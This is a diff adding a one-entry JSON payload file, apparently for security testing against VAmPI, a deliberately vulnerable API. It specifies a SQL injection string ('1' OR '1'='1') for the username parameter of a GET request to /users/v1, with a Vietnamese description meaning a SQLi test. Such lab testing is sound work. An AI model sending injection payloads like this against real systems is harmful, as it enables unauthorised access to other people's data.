@@ -1,0 +1,13 @@
+{
+  "payloads": [
+    {
+      "target_app": "vampi",
+      "endpoint": "/users/v1",
+      "method": "GET",
+      "target_param": "username",
+      "payload_value": "1' OR '1'='1",
+      "attack_type": "SQL_INJECTION",
+      "description": "Thu nghiem SQLi tren VAmPI"
+    }
+  ]
+}
